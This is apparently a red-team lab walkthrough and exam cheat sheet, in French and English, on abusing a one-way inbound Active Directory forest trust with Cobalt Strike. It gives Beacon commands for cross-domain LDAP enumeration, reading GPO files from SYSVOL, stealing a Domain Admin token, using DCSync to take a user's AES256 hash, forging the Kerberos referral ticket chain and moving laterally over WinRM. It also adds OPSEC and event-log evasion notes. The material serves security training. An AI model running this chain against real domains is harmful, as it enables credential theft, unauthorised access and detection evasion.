# Lab — Relations de confiance entrantes (Inbound Trusts)

> Ce lab étudie l’accès entre deux domaines liés par une relation de confiance entrante à sens unique.

===

## Comprendre le sens de la relation de confiance

Commencer par identifier le sens de la relation de confiance : il détermine quels utilisateurs peuvent accéder aux ressources de l’autre domaine.

```
┌─────────────────────────────────────┐        ┌─────────────────────────────────────┐
│          CONTOSO.COM                │        │           PARTNER.COM               │
│   (OUR domain — beacon runs here)   │        │  (foreign/trusting domain)          │
│                                     │        │                                     │
│  Domain SID:                        │        │  Domain SID:                        │
│  S-1-5-21-3926355307-               │        │  S-1-5-21-4244029708-               │
│       1661546229-813047887          │        │       1901239654-2578485347         │
│                                     │        │                                     │
│  trustDirection = 1 (INBOUND)  ◄────┼────────┼──  PARTNER trusts CONTOSO           │
│                                     │        │                                     │
│  "Inbound to us = we are trusted"   │        │  Resources: par-jmp-1.partner.com   │
│  "Our users can go there"           │        │  DC:        par-dc-1.partner.com    │
└─────────────────────────────────────┘        └─────────────────────────────────────┘
         TRUSTED domain                                   TRUSTING domain
   (accounts originate here)                        (resources are here)
```

**Interprétation de `trustDirection` pour le lab :**
- `trustDirection=1 INBOUND` (queried from CONTOSO) → PARTNER fait confiance à CONTOSO : les utilisateurs CONTOSO peuvent s’authentifier sur les ressources PARTNER, sous réserve des autorisations.
- `trustDirection=2 OUTBOUND` → CONTOSO fait confiance à l’autre domaine : ses utilisateurs peuvent s’authentifier sur les ressources CONTOSO.
- `trustDirection=3` → bidirectionnelle

**`trustAttributes=8` (TRUST_ATTRIBUTE_FOREST_TRANSITIVE)** indique une relation transitive entre forêts. Le filtrage des SID à la frontière empêche certains usages de SID History ; les appartenances configurées via des Foreign Security Principals (FSP) restent pertinentes.

---

## Identifier les objets dans les deux domaines

Ce tableau associe les SID du lab aux utilisateurs et groupes présents dans CONTOSO et PARTNER.

| SID | Domaine | Type d’objet | Nom | Rôle dans le lab |
|-----|--------|-------------|------|--------------------|
| S-1-5-21-**3926355307**-1661546229-813047887-**500** | CONTOSO | Utilisateur | Administrator | Compte Domain Admin initial |
| S-1-5-21-**3926355307**-1661546229-813047887-**6102** | CONTOSO | Groupe | **Partner Jump Users** | Groupe utilisé pour l’attribution de droits dans PARTNER via FSP |
| S-1-5-21-**3926355307**-1661546229-813047887-**XXXX** | CONTOSO | Utilisateur | **rsteel** | Compte membre du groupe Partner Jump Users |
| S-1-5-21-**4244029708**-1901239654-2578485347-**1104** | PARTNER | Groupe | **Contoso Users** | Groupe PARTNER contenant le SID CONTOSO via un objet FSP |
| S-1-5-**32**-544 | BUILTIN | Groupe | Administrators | Groupe administrateurs locaux ; Contoso Users y est associé par GPO dans le lab |

**Schéma des relations d’accès :**

```
rsteel (CONTOSO user)
  └─ member of: "Partner Jump Users" (CONTOSO group, SID -6102)
                    │
                    │  Foreign Security Principal in PARTNER
                    │  (PARTNER stores a proxy object with SID -6102)
                    ▼
             "Contoso Users" group (PARTNER group, SID -1104)
                    │
                    │  GPO: "Contoso Jump Users" → linked to entire PARTNER domain
                    ▼
             BUILTIN\Administrators (S-1-5-32-544)
             on ALL computers in PARTNER
                    │
                    ▼
             par-jmp-1.partner.com — rsteel is local admin here
```

**Qu’est-ce qu’un Foreign Security Principal (FSP) ?**
Lorsqu’un groupe CONTOSO devient membre d’un groupe PARTNER, le domaine PARTNER crée un objet FSP dans `CN=ForeignSecurityPrincipals,DC=partner,DC=com` pour représenter son SID. Dans le scénario, le SID de **Partner Jump Users** (`-6102`) permet de relier l’identité `rsteel` au groupe PARTNER **Contoso Users** (`-1104`), selon les relations de groupe configurées.

---

## Comprendre le parcours des tickets Kerberos

```
Step 1: DCSync rsteel hash from CONTOSO DC
         ↓
Step 2: AS-REQ → CONTOSO KDC (lon-dc-1)
         → returns: TGT_rsteel  (encrypted with CONTOSO krbtgt key)
         ↓
Step 3: TGS-REQ for krbtgt/partner.com → CONTOSO KDC
         → CONTOSO KDC sees inbound trust to PARTNER, issues referral
         → returns: INTER-REALM TGT  (encrypted with inter-realm trust key)
                    ↳ contains rsteel's SIDs including "Partner Jump Users" (-6102)
         ↓
Step 4: TGS-REQ for cifs/par-jmp-1 → PARTNER KDC (par-dc-1)
         → PARTNER KDC decrypts inter-realm TGT with trust key
         → resolves FSP: -6102 → "Contoso Users" (-1104)
         → adds -1104 to rsteel's PAC
         → returns: SERVICE TICKET for cifs/par-jmp-1  (encrypted with par-jmp-1 key)
         ↓
Step 5: SMB to par-jmp-1 with service ticket
         → par-jmp-1 sees "Contoso Users" (-1104) in PAC
         → GPO says -1104 = local admin
         → ACCESS GRANTED
```

**À retenir :** le parcours fait intervenir un TGT CONTOSO, un TGT inter-realm au passage de la relation de confiance, puis un ticket de service PARTNER. Les tickets sont délivrés par différentes autorités Kerberos.

===

## Énumération

### Informations à vérifier
Vérifier l’existence et le sens de la trust, l’objet CONTOSO référencé dans PARTNER, son type et les utilisateurs membres du groupe concerné.

1. Ouvrir Cobalt Strike et se connecter au team server.
2. Dans le Beacon de moyenne intégrité, énumérer les relations de confiance.

    ```Beacon-nocolor
    ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
    ```

    > Cette requête recherche les objets `trustedDomain` dans CONTOSO et récupère quatre attributs :
    > - `trustPartner` — le nom FQDN du domaine distant (ici `partner.com`)
    > - `trustDirection` — la direction de la trust depuis CONTOSO
    > - `trustAttributes` — les indicateurs décrivant le type de trust
    > - `flatname` — le nom NetBIOS du domaine distant (ici `PARTNER`)

⚠️ Comment interpréter ces résultats ?
    >
    > - `trustDirection 1` = **TRUST_DIRECTION_INBOUND** — PARTNER fait confiance à CONTOSO ; certains utilisateurs CONTOSO peuvent s’authentifier sur des ressources PARTNER.
    > - `trustAttributes 8` = **TRUST_ATTRIBUTE_FOREST_TRANSITIVE** — relation entre forêts ; le filtrage des SID limite les utilisations de SID History entre les domaines. Les appartenances FSP restent prises en compte.

3. Énumérer le conteneur Foreign Security Principals du domaine distant.

    ```Beacon-nocolor
    ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
    ```

    > **Fonctionnement :** les options `--hostname partner.com` et `--dn DC=partner,DC=com` ciblent l’annuaire PARTNER. Le filtre cherche les objets `foreignSecurityPrincipal` représentant les comptes et groupes externes.
    >
    > **Pourquoi interroger PARTNER ?** La relation de confiance permet, selon les permissions configurées, certaines requêtes LDAP du contexte CONTOSO vers PARTNER.
    >
    > L’attribut `objectSid` de l’objet FSP représente le SID CONTOSO référencé. `memberOf` indique les groupes PARTNER auxquels l’objet appartient.

⚠️ Le résultat attendu indique que le SID CONTOSO `S-1-5-21-3926355307-1661546229-813047887-6102` est associé au groupe **Contoso Users** dans PARTNER.

    > **À ce stade :** un objet CONTOSO portant le SID `-6102` est référencé par PARTNER. Il reste à déterminer s’il s’agit d’un utilisateur ou d’un groupe.

4. Identifier l’objet correspondant à ce SID dans CONTOSO.

    ```Beacon-nocolor
    ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) --attributes samAccountType,distinguishedName
    ```

    > **Fonctionnement :** la requête vise à nouveau CONTOSO et recherche l’objet propriétaire du SID se terminant par `-6102`.
    >
    > `samAccountType` identifie le type d’objet :
    > - `805306368` = compte utilisateur
    > - `268435456` = groupe de domaine (résultat attendu)
    > - `805306369` = compte ordinateur

⚠️ Le résultat du lab identifie le groupe CONTOSO **Partner Jump Users**. Ce groupe est associé à **Contoso Users** dans PARTNER grâce au FSP. Les droits effectifs sont ensuite définis par la GPO.

5. Énumérer les membres de ce groupe.

    ```Beacon-nocolor
    ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
    ```

    > **Fonctionnement :** rechercher les utilisateurs et groupes membres directs de **Partner Jump Users** dans CONTOSO, en utilisant le DN complet du groupe dans le filtre `memberof`.
    >
    > **Utilité :** l’appartenance à ce groupe indique quels comptes CONTOSO disposent d’une relation d’autorisation vers PARTNER, selon les règles définies dans le lab.

⚠️ Résultat attendu : `rsteel`, utilisateur CONTOSO membre de **Partner Jump Users**.

6. Identifier un Domain Controller du domaine distant.

    ```Beacon-nocolor
    nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
    ```

    > **Fonctionnement :** une recherche DNS SRV sur le DC `10.10.120.1` identifie le Domain Controller PARTNER. Le résultat attendu est `par-dc-1.partner.com`, utilisé ensuite dans les échanges Kerberos du lab.

===

## Discovery

Énumérer PARTNER pour déterminer sur quelles machines le groupe **Contoso Users** dispose de privilèges.

### Informations à vérifier
Le groupe **Contoso Users** existe dans PARTNER. Il faut vérifier si ses droits administrateur locaux proviennent d’une GPO et identifier les machines concernées.

1. Lister les GPO.

    ```Beacon-nocolor
    ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
    ```

    > La requête recense les Group Policy Objects de PARTNER. L’attribut `gPCFileSysPath` indique le chemin SYSVOL contenant leurs fichiers de configuration.

⚠️ Le lab présente une GPO **Contoso Jump Users**, dont `gPCFileSysPath` renvoie le chemin contenant son GUID : `\\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\`

2. Récupérer le fichier `GptTmpl.inf` de la GPO.

    ```Beacon-nocolor
    download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
    ```

    > `GptTmpl.inf` est un fichier de modèle de sécurité GPO. La section `[Group Membership]` indique les SID ajoutés aux groupes locaux, sans nécessiter de session interactive sur la machine.
    >
    > Dans ce scénario, le téléchargement SMB utilise le contexte Kerberos disponible, sous réserve des autorisations prévues par la relation de confiance.

3. Synchroniser le fichier sur l’Attacker Desktop, puis l’ouvrir avec Notepad.

⚠️ Le fichier contient :
    > ```
    > [Group Membership]
    > *S-1-5-21-4244029708-1901239654-2578485347-1104__Memberof = *S-1-5-32-544
    > ```
    > Interprétation : le SID PARTNER `S-1-5-21-4244029708-...-1104` correspond à **Contoso Users**. Ce groupe est associé à `S-1-5-32-544`, le groupe local **Administrators**, sur les machines auxquelles la GPO s’applique.
    >
    > **Détail des SID :**
    > - `S-1-5-21-4244029708-1901239654-2578485347` → préfixe SID du domaine PARTNER
    > - `-1104` → RID du groupe Contoso Users dans PARTNER
    > - `S-1-5-32-544` → SID bien connu du groupe Administrators local

4. Vérifier que **Contoso Users** (`-1104`, PARTNER) contient le FSP du groupe **Partner Jump Users** (`-6102`, CONTOSO).

    ```Beacon-nocolor
    ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes samAccountType,samAccountName,member
    ```

    > Cette requête identifie le groupe PARTNER portant le SID `-1104`. L’attribut `member` permet de vérifier la présence du FSP correspondant à **Partner Jump Users**, puis de relier cette appartenance aux droits locaux définis par GPO.

5. Identifier les objets auxquels la GPO est liée.

    ```Beacon-nocolor
    ldapsearch (&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*)) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name
    ```

    > La recherche examine l’attribut `gPLink` des OU et objets du domaine PARTNER afin de localiser la GPO étudiée.

⚠️ Dans le scénario, la GPO est liée à la racine du domaine PARTNER. Son application effective dépend également des paramètres et filtres de stratégie.

6. Lister les ordinateurs présents dans le domaine distant.

    ```Beacon-nocolor
    ldapsearch (samAccountType=805306369) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes distinguishedName
    ```

    > `samAccountType=805306369` = compte ordinateurs. Lists all machines in PARTNER so you know valid targets. `par-jmp-1.partner.com` will appear here — this is our jump target for the exploitation step.

===

## Scénario d’exploitation du lab

### Objectif de cette phase
We have DA on CONTOSO. rsteel (a CONTOSO user) has local admin on all PARTNER machines via group membership. We need to authenticate to a PARTNER machine **as rsteel** using Kerberos. We cannot use rsteel's plaintext password (we don't have it), but we have DA so we can DCSync the AES256 hash and use that to mint a TGT. Then we walk the Kerberos referral chain across the trust.

**Compte étudié :** `rsteel` — a CONTOSO domain user, member of "Partner Jump Users"
**Machine cible :** `par-jmp-1.partner.com` — a jump server in PARTNER where rsteel has local admin

> **Point important pour l’examen :**
> DCSync requires DA rights. `steal_token` MUST happen before `dcsync` or it will fail with `ERROR_DS_DRA_ACCESS_DENIED (0x20f7)`. Running DCSync as `NT AUTHORITY\SYSTEM` on a workstation does NOT work — SYSTEM is a local identity with no AD replication rights.
> `kerberos_ticket_use` MUST be called before any network command that needs the injected ticket. `krb_asktgt`/`krb_asktgs` obtain tickets but the beacon's SMB/WinRM stack will not use them until `kerberos_ticket_use` wires the `.kirbi` into the active Kerberos session.

---

1. **OPSEC-🟢SAFE** — Steal a DA token on the high-integrity Beacon.

    ```cs
    beacon> process_browser                    // find a process owned by dyork
    beacon> steal_token <dyork-pid>            // impersonate CONTOSO\dyork in-process, no spawn
    ```

    > Duplicates dyork's token into the beacon process. No child process, no Event 4688. This is the only way to DCSync — you need a token with `DS-Replication-Get-Changes-All` rights on the domain, which DA accounts have. `NT AUTHORITY\SYSTEM` on a workstation does not have this right.
    >
    > ⚠️ **Exam trap:** If you skip this step and run `dcsync` while the beacon token is SYSTEM, you get `ERROR_DS_DRA_ACCESS_DENIED (0x20f7)`. The DCSync silently fails and you have no hash to continue with.

2. **OPSEC-🟠CAUTION** — DCSync *rsteel*'s AES256 hash.

    ```cs
    beacon> dcsync contoso.com CONTOSO\rsteel
    ```

    > **rsteel, not Administrator?** rsteel is the bridge account — member of "Partner Jump Users" which maps via FSP to PARTNER local admin. DCSync with dyork's token generates Event 4662 on the DC. Use the `aes256_hmac` value only — AES256 is normal pre-auth behaviour and less anomalous than RC4.
    >
    > Event log: **4662** on `lon-dc-1` — Directory Service access, Properties: `DS-Replication-Get-Changes-All`

3. **OPSEC-🟠CAUTION** — Request a TGT for *rsteel* from CONTOSO's KDC.

    ```cs
    beacon> krb_asktgt /user:rsteel /aes256:<aes256_hmac-from-dcsync>
    ```

    > AS-REQ sent to CONTOSO's KDC using rsteel's AES256 hash as pre-auth. KDC returns a TGT for `rsteel@CONTOSO.COM` encrypted with CONTOSO's `krbtgt` key.
    >
    > **Ticket in hand:** `TGT_rsteel` — valid for CONTOSO only.
    >
    > **Save the base64 output** — you need it for step 4 AND to decode to `rsteel_tgt.kirbi` for step 7.
    >
    > Event log: **4768** (AS-REQ) on `lon-dc-1`

4. **OPSEC-🟠CAUTION** — Request an inter-realm referral ticket.

    ```cs
    beacon> krb_asktgs /service:krbtgt/partner.com /ticket:<base64-TGT>
    ```

    > TGS-REQ to CONTOSO's KDC for service `krbtgt/partner.com`. Requesting the `krbtgt` of a foreign realm signals a cross-realm referral. CONTOSO's KDC sees the inbound trust with PARTNER and issues a cross-realm TGT encrypted with the **inter-realm trust key** — shared between both KDCs, derived from the trust password.
    >
    > **Ticket in hand:** `INTER-REALM TGT` — only PARTNER's KDC can decrypt this. Contains rsteel's SIDs including "Partner Jump Users" (-6102).
    >
    > **Save the base64 output** — used in steps 5 and 5b.
    >
    > Event log: **4769** (TGS-REQ for `krbtgt/partner.com`) on `lon-dc-1` — unusual, normal users don't request cross-realm referrals directly.

5. **OPSEC-🟠CAUTION** — Request a CIFS service ticket for *par-jmp-1* from PARTNER's KDC.

    ```cs
    beacon> krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
    ```

    > TGS-REQ sent to **PARTNER's KDC** (`/dc:par-dc-1.partner.com` — critical, must point at PARTNER, not CONTOSO). PARTNER's KDC:
    > 1. Decrypts inter-realm TGT with the trust key → validates it came from CONTOSO
    > 2. Reads rsteel's PAC → sees `-6102` (Partner Jump Users)
    > 3. Resolves FSP: `-6102` → member of "Contoso Users" (`-1104`)
    > 4. Adds `-1104` to rsteel's PAC in the new ticket
    > 5. Issues CIFS service ticket encrypted with par-jmp-1's machine account key
    >
    > **Ticket in hand:** `SERVICE TICKET` for `cifs/par-jmp-1.partner.com` — PAC contains `-1104` which GPO maps to local Administrators.
    >
    > **Save the base64 output** — decode to `rsteel_cifs.kirbi`.
    >
    > Event log: **4769** on `par-dc-1` — first event generated on PARTNER infrastructure.

5b. **OPSEC-🟠CAUTION** — Also request an HTTP service ticket for WinRM lateral movement.

    ```cs
    beacon> krb_asktgs /service:http/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
    ```

    > `jump winrm64` authenticates over WinRM using the **`http` SPN**, not `cifs`. If you only inject the CIFS ticket and then run `jump winrm64`, you get error `0x8009030e` — "A specified logon session does not exist" — because Kerberos cannot find a ticket for `http/par-jmp-1.partner.com` in the session.
    >
    > **Same inter-realm ticket is reused** — no extra DCSync or TGT needed, just a second `krb_asktgs` call with `http` instead of `cifs`.
    >
    > **Save the base64 output** — decode to `rsteel_http.kirbi`.
    >
    > Event log: **4769** on `par-dc-1`

6. **OPSEC-🟢SAFE** — Decode the `.kirbi` files on the attacker desktop.

    ```powershell
    # Run on attacker Windows desktop (not in beacon) — CyberChef or PowerShell:
    [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_cifs.kirbi",
      [System.Convert]::FromBase64String("<base64-from-step-5>"))

    [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_http.kirbi",
      [System.Convert]::FromBase64String("<base64-from-step-5b>"))

    [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_tgt.kirbi",
      [System.Convert]::FromBase64String("<base64-from-step-3>"))
    ```

    > Local file operation — no Kerberos events, no network traffic.

7. **OPSEC-🟢SAFE** — Inject the CIFS ticket and verify.

    ```cs
    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_cifs.kirbi
    beacon> run klist
    ```

    > `kerberos_ticket_use` wires the `.kirbi` into the beacon's active Kerberos logon session. Without this step, the beacon's SMB stack uses its existing token identity (SYSTEM or low-priv user) and ignores the Kerbeus-obtained ticket entirely.
    >
    > Verify `klist` output shows: `Server: cifs/par-jmp-1.partner.com @ PARTNER.COM`
    > The `@ PARTNER.COM` confirms the ticket was issued by PARTNER's KDC, not CONTOSO's.
    >
    > ⚠️ **Exam trap:** Skipping `kerberos_ticket_use` and going straight to `ls` will give `ERROR_ACCESS_DENIED (5)` even though `krb_asktgs` returned a valid ticket.

8. **OPSEC-🟢SAFE** — Access C$ on *par-jmp-1* via SMB.

    ```cs
    beacon> ls \\par-jmp-1.partner.com\c$
    ```

    > Service ticket is presented to par-jmp-1 over SMB. par-jmp-1 decrypts with its machine account key, reads the PAC, sees "Contoso Users" (-1104), maps to local Administrators via GPO — access granted.
    >
    > Event log: **4624 Type 3** (network logon) on `par-jmp-1` — normal admin SMB, no lateral movement artefact.

9. **OPSEC-🟢SAFE** — Lateral move to *par-jmp-1* via WinRM.

    ```cs
    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_http.kirbi
    beacon> run klist                           // verify: http/par-jmp-1.partner.com @ PARTNER.COM
    beacon> jump winrm64 par-jmp-1.partner.com smb
    ```

    > Inject the HTTP ticket, then `jump winrm64`. WinRM authentication uses the `http` SPN — this ticket gives Kerberos auth across the trust boundary. CS injects a beacon into `wsmprovhost.exe` on par-jmp-1 and connects back over the SMB listener named pipe.
    >
    > ⚠️ **Exam trap:** If you only injected the CIFS ticket and run `jump winrm64`, you get `0x8009030e` — logon session error. You need BOTH tickets: `cifs` for `ls`/`download`, `http` for `jump winrm64`.
    >
    > Event log: **4624 Type 3** on `par-jmp-1` — WinRM network logon from rsteel. No service created, no Event 7045.

10. **Cleanup** — OPSEC-🟢SAFE.

    ```cs
    beacon> kerberos_ticket_purge               // remove all injected tickets from session
    beacon> rev2self                            // drop dyork impersonation token
    ```

⚠️ In this lab, you have taken advantage of legit access assigned across a one-way inbound trust. The entire chain — DCSync → 3-ticket Kerberos referral → SMB access → WinRM lateral move — generates events only in CONTOSO (4662, 4768, 4769) and one network logon event on par-jmp-1. No process creation, no service installation, no disk writes on the target.

===

## Quick Reference — Exam Day Cheat Sheet

### Trust Direction Decision Tree
```
Query your domain → find trustedDomain objects

trustDirection=1 (INBOUND)  → YOU are trusted → YOUR users access THEIR resources
trustDirection=2 (OUTBOUND) → THEY are trusted → THEIR users access YOUR resources
trustDirection=3 (BOTH)     → bidirectional
trustAttributes=8           → forest trust → SID filtering ON → no SID history abuse
trustAttributes=32          → TREAT_AS_EXTERNAL → SID filtering partially relaxed
```

### Ticket Chain for Cross-Trust Access
```
0. steal_token <DA-pid>                                                      OPSEC-🟢SAFE   PREREQUISITE
1. dcsync <domain> <DOMAIN\user>                                             OPSEC-🟠CAUTION Event 4662 on source DC
2. krb_asktgt /user:<user> /aes256:<hash>         → TGT                     OPSEC-🟠CAUTION Event 4768 on source DC
3. krb_asktgs /service:krbtgt/foreign.domain      → INTER-REALM TGT         OPSEC-🟠CAUTION Event 4769 on source DC
4. krb_asktgs /service:cifs/target /dc:foreign-dc → CIFS SERVICE TICKET     OPSEC-🟠CAUTION Event 4769 on foreign DC
4b.krb_asktgs /service:http/target /dc:foreign-dc → HTTP SERVICE TICKET     OPSEC-🟠CAUTION Event 4769 on foreign DC
5. [decode base64 → .kirbi on attacker desktop]                              OPSEC-🟢SAFE   local only
6. kerberos_ticket_use <cifs.kirbi>               → inject CIFS ticket       OPSEC-🟢SAFE   REQUIRED before ls
7. ls \\target\c$                                 → SMB access confirmed     OPSEC-🟢SAFE   Event 4624 T3 on target
8. kerberos_ticket_use <http.kirbi>               → inject HTTP ticket       OPSEC-🟢SAFE   REQUIRED before winrm
9. jump winrm64 target smb                        → beacon in wsmprovhost    OPSEC-🟢SAFE   Event 4624 T3 on target
10.kerberos_ticket_purge + rev2self               → cleanup                  OPSEC-🟢SAFE
```

### Common Failures and Fixes
```
ERROR_DS_DRA_ACCESS_DENIED (0x20f7) on dcsync
  → You skipped steal_token. SYSTEM on a workstation ≠ DA rights.
  → Fix: process_browser → steal_token <DA-pid> → retry dcsync

ERROR_ACCESS_DENIED (5) on ls after krb_asktgs
  → You skipped kerberos_ticket_use. The ticket was obtained but not wired in.
  → Fix: decode base64 → .kirbi → kerberos_ticket_use <cifs.kirbi> → retry ls

0x8009030e logon session error on jump winrm64
  → You only injected the CIFS ticket. WinRM uses http SPN, not cifs.
  → Fix: krb_asktgs http/target + kerberos_ticket_use <http.kirbi> → retry jump winrm64
  → Also check: klist should show http/target @ FOREIGN.DOMAIN before jump
```

### SID Identification by Domain Prefix
```
S-1-5-21-3926355307-1661546229-813047887-XXXX  → CONTOSO object
S-1-5-21-4244029708-1901239654-2578485347-XXXX → PARTNER object
S-1-5-32-544                                    → BUILTIN\Administrators (local, any machine)
```

### What to Look For During Enumeration
```
FSP (foreignSecurityPrincipal) in foreign domain  → a CONTOSO object has access in PARTNER
objectSid on FSP has YOUR domain prefix            → resolve it in YOUR domain
GptTmpl.inf [Group Membership] section            → shows which SID → which local group
gPLink on domain/OU object                        → shows GPO scope (domain-wide = all machines)
samAccountType=805306369                           → computer accounts (valid targets)
```
